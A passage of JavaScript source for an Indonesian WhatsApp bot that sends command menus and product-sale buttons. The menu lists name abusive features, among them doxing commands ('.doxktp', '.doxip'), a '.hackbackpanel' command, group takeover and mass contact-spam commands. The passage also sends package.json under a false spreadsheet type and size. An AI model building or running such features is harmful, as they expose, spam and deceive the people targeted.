                                    { title: "Storemenu 🏬", id: ".storemenu", description: "Akses ke toko digital untuk pembelian produk dan layanan." },
                                    { title: "Paymentmenu 💳", id: ".paymentmenu", description: "Mengelola metode pembayaran dan transaksi keuangan." },
                                    { title: "Digitaloceanmenu 🌐", id: ".digitaloceanmenu", description: "Layanan dan alat terkait DigitalOcean untuk pengelolaan server cloud." },
                                    { title: "Panelownermenu ⚙️", id: ".panelownermenu", description: "Panel khusus untuk pemilik dengan akses penuh ke sistem." },
                                    { title: "Panelsellermenu 🛠️", id: ".panelsellermenu", description: "Panel pengelolaan bagi penjual untuk mengatur layanan dan produk." },
                                    { title: "Stockmenu 📋", id: ".stockmenu", description: "Stock Untuk Mempermudah Anda Jualan Tidak Repot Untuk Buat Manual." },
                                    { title: "Produkmenu 📋", id: ".produkmenu", description: "Produk Untuk Mempermudah Anda Jualan Tidak Repot Untuk Buat Manual." },
                                    { title: "Installermenu 🖥️", id: ".installermenu", description: "Panduan dan alat untuk instalasi perangkat lunak atau sistem." },
                                    { title: "Groupmenu 📢", id: ".groupmenu", description: "Mengelola dan berinteraksi dengan grup pengguna atau komunitas." },
                                    { title: "Ownermenu 👑", id: ".ownermenu", description: "Menu eksklusif untuk pemilik sistem dengan kontrol penuh." },
                                    { title: "Help ❓", id: ".help", description: "Panduan dan bantuan untuk menggunakan sistem dengan lebih efektif." }
                                ]
                            }
                        ]
                    })
                }
            },
            { 
                buttonId: '.allmenu', 
                buttonText: { displayText: 'All Menu' }, 
                type: 1 
            },
            { 
                buttonId: '.layanan', 
                buttonText: { displayText: 'Layanan Kami' }, 
                type: 1 
            },
            { 
                buttonId: '.owner', 
                buttonText: { displayText: 'Hubungi Developer' }, 
                type: 1 
            }
        ],
        headerType: 1,
        viewOnce: true,
        image: { url: global.image.reply }, 
        caption: `${infoMessage}\nHaii @${m.sender.split("@")[0]} 👋,\nSaya adalah *${global.botname2}* 🤖.\nKlik tombol menu di bawah ini untuk mengetahui berbagai fitur yang saya tawarkan! 🚀\n`
    }, { quoted: qtext2 });
}const rafa = fs.readFileSync('./musik/menu.mp3');
    conn.sendMessage(m.chat, { audio: rafa, mimetype: 'audio/mpeg', ptt: true }, { quoted: qtext3 });
break;

case 'allmenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
✨ Bot Information ✨
🤖 Botname : ${global.botname2}
🔥 Version : ${global.versi}
🚀 Mode : ${conn.public ? "Public" : "Self"}
👑 Creator : @${global.owner}
⏳ Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
🖥️ Uptime VPS : ${runtime(os.uptime())}
📌 Total Fitur : ${totalFitur()}

💠 Your Status: (${isCreator ? "👑 Ownerbot" : isPremium ? "💎 Reseller Panel" : isSeller ? "🔰 Premium Pengguna" : "🆓 Free User"})
  
\`▧ Newmenu\`
  • .cadp
  • .cadp2
  • .topup
  • .pushjpm
  • .backup
  • .backup2(Ke Group Pv Anda)
  • .backup3(Start.js)
  • .backup4(Module)
  • .backup5(Sikima.js)
  • .backup6(Session.js)
  • .totalpanel(cekpanel)
  • .totaluser(cekuserpanel)
  • .totaladmin(cekadminpanel)

\`▧ Catatatmenu\`
  • .addpendapatan
  • .delpendapatan
  • .resetpendapatan
  • .resethutang
  • .addhutang
  • .delhutang
  • .listhutang
  • .resetdp
  • .adddp
  • .deldp
  • .listdp

\`▧ Othermenu\`
  • .cekidch
  • .cekidgc
  • .qc
  • .brat
  • .bratvid
  • .readviewonce
  • .stickerwm
  • .sticker
  
\`▧ Searchmenu\`
  • .yts
  • .apkmod
  • .pinterest
  • .gimage  
  • .sfile
  
\`▧ Toolsmenu\`
  • .ai
  • .gpt
  • .tourl
  • .tourl2
  • .ssweb
  • .translate
  • .tohd
  • .shortlink
  • .shortlink2
  • .enc
  • .enchard

\`▧ Otomatismenu\`
  • .addsaldo(tnpa gateway)
  • .minsaldo(tnpa gateway)
  • .ceksaldo(tnpa gateway)
  • .buyown(tnpa gateway)
  • .buysell(tnpa gateway)

\`▧ Shopmenu\`
  • .sewa 
  • .shop
  • .deposit
  • .cekshop
  • .sewabot
  • .buyjasainstall
  • .buyjasathema
  • .buysubdo
  • .buyakses
  • .buyownpnl
  • .buyptpnl
  • .isipulsa
  • .topup-dana
  • .topup-ovo
  • .topup-gopay
  • .topup-shopepay 
  
\`▧ Stockmenu\`
  • .addstockdo
  • .delstockdo
  • .checkstockdo
  • .editstockdo
  • .liststockdo
  • .buystockdo
  • .stockdo
  • .addstock
  • .delstock
  • .checkstock
  • .editstock
  • .liststock
  • .buystock
  • .stock

\`▧ Produkmenu\`
  • .addproduk
  • .delproduk
  • .checkproduk
  • .editproduk
  • .listproduk
  • .buyproduk

\`▧ Downloadmenu\`
  • .tiktok
  • .tiktokmp3
  • .facebook
  • .capcut
  • .instagram
  • .ytmp3
  • .ytmp4
  • .play
  • .playvid
  • .gitclone
  • .mediafire
  
\`▧ Storemenu\`
  • .addrespon
  • .delrespon
  • .listrespon
  • .done
  • .proses
  • .jpm (Teks)
  • .jpm2 (Foto)
  • .jpm3 (Video)
  • .jpmtesti
  • .jpmslide
  • .jpmslideht
  • .sendtesti
  • .jpmch (Teks)
  • .jpmch2 (Foto)
  • .jpmch3 (Timer)
  • .addid (Channel)
  • .delid (Channel)
  • .listid (Channel)
  • .pushkontak
  • .pushkontak2
  • .pushkontaklist
  • .push-vbutton
  • .payment
  • .produk

\`▧ Paymentmenu\`
  • .dana
  • .ovo
  • .gopay

\`▧ Digitaloceanmenu\`
  • .cvps
  • .sisadropletall
  • .sisadroplet
  • .deldroplet
  • .listdropletall
  • .listdroplet
  • .cekdroplet
  • .rebuild
  • .restartvps
  • .turnon/startvps
  • .turnoff/stopvps
  • .changeapido
  • .cekakunv1
  • .resetpwvps
  • .createvps(button)
  • .createvps2(button+2 api)
  
\`▧ Panelmenu Reseller\`
  • .1gb
  • .2gb
  • .3gb
  • .4gb
  • .5gb
  • .6gb
  • .7gb
  • .8gb
  • .9gb
  • .10gb
  • .unlimited
  • .adm
  • .cadmin
  • .delpanel
  • .deladmin
  • .listpanel
  • .listadmin
  • .updomain
  • .upapikey
  • .upcapikey
  • .adddomain
    
\`▧ Panelmenu Owner\`
  • .1gb-v2
  • .2gb-v2
  • .3gb-v2
  • .4gb-v2
  • .5gb-v2
  • .6gb-v2
  • .7gb-v2
  • .8gb-v2
  • .9gb-v2
  • .10gb-v2
  • .unlimited-v2
  • .cadmin-v2
  • .adm-v2
  • .delpanel-v2
  • .deladmin-v2
  • .listpanel-v2
  • .listadmin-v2
  • .updomain-v2
  • .upapikey-v2
  • .upcapikey-v2
  • .adddomain-v2
  
\`▧ Installermenu\`
  • .hackbackpanel
  • .installthema
  • .installpanel
  • .installdepend (buat addon nebula)
  • .installtemastellar
  • .installtemabilling
  • .installtemaenigma
  • .installtemanightcore
  • .installtemanebula
  • .installtemaelysium
  • .uninstallpanel
  • .uninstalltema
  • .uninstalladdon (addon nebula)
  
\`▧ Groupmenu\`
  • .antilink
  • .antilink2
  • .blacklistjpm
  • .delbljpm
  • .listdaftarbl
  • .welcome
  • .add
  • .kick
  • .close
  • .open
  • .hidetag
  • .kudetagc
  • .leave
  • .tagall
  • .promote
  • .demote
  • .resetlinkgc
  • .linkgc
  
\`▧ Ownermenu\`
  • .autoread
  • .autopromosi
  • .autoreadsw
  • .autotyping
  • .addowner
  • .listowner
  • .delowner
  • .resetowner
  • .addseller
  • .delseller
  • .listseller
  • .resetseller
  • .addprem
  • .delprem
  • .listprem
  • .resetprem
  • .self/public
  • .subdomain
  • .setimgmenu
  • .setimgfake
  • .setppbot
  • .clearsession
  • .clearchat
  • .resetdb
  • .restartbot
  • .getsc
  • .addcase
  • .delcase
  • .getcase
  • .cekcase
  • .adddb2
  • .deldb2
  • .listdb2
  • .listgc
  • .joingc
  • .joinch
  • .runtime
  • .upchannel
  • .upchannel2
  • .doxktp
  • .doxip
  • .resetban
  • .listban
  • .unban
  • .ban
  `
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
  title: 'Panel Pterodactyl',
  description: 'Panel Pterodactyl adalah antarmuka pengguna yang digunakan untuk mengelola server game secara efisien dan mudah.',
  id: '.buypanel'
},
{
  title: 'Admin Panel Pterodactyl',
  description: 'Admin Panel Pterodactyl memungkinkan administrator untuk mengelola berbagai aspek server game dengan kontrol penuh dan fungsionalitas lanjutan.',
  id: '.buyadp'
},
{
  title: 'Vps (Virtual Private Server)',
  description: 'VPS adalah layanan hosting yang memberikan kontrol lebih pada server, cocok untuk hosting aplikasi atau website dengan kebutuhan lebih tinggi.',
  id: '.buyvps'
},
{
  title: 'Script Bot WhatsApp',
  description: 'Script Bot WhatsApp memungkinkan otomatisasi percakapan melalui WhatsApp, ideal untuk bisnis yang ingin memberikan layanan pelanggan secara efisien.',
  id: '.buysc'
}
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'ownermenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Ownermenu\`
  • .autoread
  • .autopromosi
  • .autoreadsw
  • .autotyping
  • .addowner
  • .listowner
  • .delowner
  • .resetowner
  • .addseller
  • .delseller
  • .listseller
  • .resetseller
  • .addprem
  • .delprem
  • .listprem
  • .resetprem
  • .self/public
  • .subdomain
  • .setimgmenu
  • .setimgfake
  • .setppbot
  • .clearsession
  • .clearchat
  • .resetdb
  • .restartbot
  • .getsc
  • .addcase
  • .delcase
  • .getcase
  • .cekcase
  • .adddb2
  • .deldb2
  • .listdb2
  • .listgc
  • .joingc
  • .joinch
  • .runtime
  • .upchannel
  • .upchannel2
  • .doxktp
  • .doxip
  • .resetban
  • .listban
  • .unban
  • .ban
  `
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'groupmenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Groupmenu\`
  • .antilink
  • .antilink2
  • .blacklistjpm
  • .delbljpm
  • .listdaftarbl
  • .welcome
  • .add
  • .kick
  • .close
  • .open
  • .hidetag
  • .kudetagc
  • .leave
  • .tagall
  • .promote
  • .demote
  • .resetlinkgc
  • .linkgc
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'installermenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Installermenu\`
  • .hackbackpanel
  • .installthema
  • .installpanel
  • .installdepend (buat addon nebula)
  • .installtemastellar
  • .installtemabilling
  • .installtemaenigma
  • .installtemanightcore
  • .installtemanebula
  • .installtemaelysium
  • .uninstallpanel
  • .uninstalltema
  • .uninstalladdon (addon nebula)
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'panelownermenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
    let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Panelmenu Owner\`
  • .1gb-v2
  • .2gb-v2
  • .3gb-v2
  • .4gb-v2
  • .5gb-v2
  • .6gb-v2
  • .7gb-v2
  • .8gb-v2
  • .9gb-v2
  • .10gb-v2
  • .unlimited-v2
  • .cadmin-v2
  • .adm-v2
  • .delpanel-v2
  • .deladmin-v2
  • .listpanel-v2
  • .listadmin-v2
  • .updomain-v2
  • .upapikey-v2
  • .upcapikey-v2
  • .adddomain-v2
`;

    await conn.sendMessage(m.chat, {
        footer: `© 2025 ${global.botname2}`,
        buttons: [
            {
                buttonId: '.owner',
                buttonText: { displayText: 'Hubungi Developer' },
                type: 1
            },
            {
                buttonId: '.buyowner',
                buttonText: { displayText: 'Buy Owner Panel' },
                type: 1
            },
            {
                buttonId: 'action',
                buttonText: { displayText: 'Beli Produk' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'Beli Produk',
                        sections: [
                            {
                                title: 'List Produk',
                                highlight_label: 'Recommended',
                                rows: [
                                    { title: 'Panel Pterodactyl', id: '.buypanel' },
                                    { title: 'Admin Panel Pterodactyl', id: '.buyadp' },
                                    { title: 'VPS (Virtual Private Server)', id: '.buyvps' },
                                    { title: 'Script Bot WhatsApp', id: '.buysc' }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 1,
        viewOnce: true,
        document: fs.readFileSync("./package.json"),
        fileName: `By ${namaOwner} </>`,
        mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        fileLength: 99999999,
        caption: teks,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran
            },
            externalAdReply: {
                title: `${global.botname2} - ${global.versi}`,
                body: `📍 Runtime: ${runtime(process.uptime())}`,
                thumbnailUrl: global.image.menu,
                sourceUrl: global.linkSaluran,
                mediaType: 1,
                renderLargerThumbnail: true,
            }
        }
    }, { quoted: m });
}
break;


case 'panelsellermenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
    let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*
  
\`▧ Panelmenu Reseller\`
  • .1gb
  • .2gb
  • .3gb
  • .4gb
  • .5gb
  • .6gb
  • .7gb
  • .8gb
  • .9gb
  • .10gb
  • .unlimited
  • .adm
  • .cadmin
  • .delpanel
  • .deladmin
  • .listpanel
  • .listadmin
  • .updomain
  • .upapikey
  • .upcapikey
  • .adddomain
`;

    await conn.sendMessage(m.chat, {
        footer: `© 2025 ${global.botname2}`,
        buttons: [
            {
                buttonId: '.owner',
                buttonText: { displayText: 'Hubungi Developer' },
                type: 1
            },
            {
                buttonId: '.buyseller',
                buttonText: { displayText: 'Buy Seller Panel' },
                type: 1
            },
            {
                buttonId: 'action',
                buttonText: { displayText: 'Beli Produk' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'Beli Produk',
                        sections: [
                            {
                                title: 'List Produk',
                                highlight_label: 'Recommended',
                                rows: [
                                    { title: 'Panel Pterodactyl', id: '.buypanel' },
                                    { title: 'Admin Panel Pterodactyl', id: '.buyadp' },
                                    { title: 'VPS (Virtual Private Server)', id: '.buyvps' },
                                    { title: 'Script Bot WhatsApp', id: '.buysc' }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 1,
        viewOnce: true,
        document: fs.readFileSync("./package.json"),
        fileName: `By ${namaOwner} </>`,
        mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        fileLength: 99999999,
        caption: teks,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.namaSaluran
            },
            externalAdReply: {
                title: `${global.botname2} - ${global.versi}`,
                body: `📍 Runtime: ${runtime(process.uptime())}`,
                thumbnailUrl: global.image.menu,
                sourceUrl: global.linkSaluran,
                mediaType: 1,
                renderLargerThumbnail: true,
            }
        }
    }, { quoted: m });
}
break;

case 'digitaloceanmenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*

\`▧ Digitaloceanmenu\`
  • .cvps
  • .sisadropletall
  • .sisadroplet
  • .deldroplet
  • .listdropletall
  • .listdroplet
  • .cekdroplet
  • .rebuild
  • .restartvps
  • .turnon/startvps
  • .turnoff/stopvps
  • .changeapido
  • .cekakunv1
  • .resetpwvps
  • .createvps(button)
  • .createvps2(button+2 api)
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'paymentmenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
let teks = `
\`▧ I N F O R M A T I O N\`
• Botname : ${global.botname2}
• Version : ${global.versi}
• Mode : ${conn.public ? "Public" : "Self"}
• Creator : @${global.owner}
• Waktu : ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
• Uptime Vps : ${runtime(os.uptime())}
• Total Fitur : ${totalFitur()}
  
  • Your Status: *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : isSeller ? "Premium Pengguna" : "Free User"})*

\`▧ Paymentmenu\`
  • .dana
  • .ovo
  • .gopay
`
await conn.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  fileLength: 99999999,
  caption: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   },    
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.image.menu,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

case 'storemenu': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
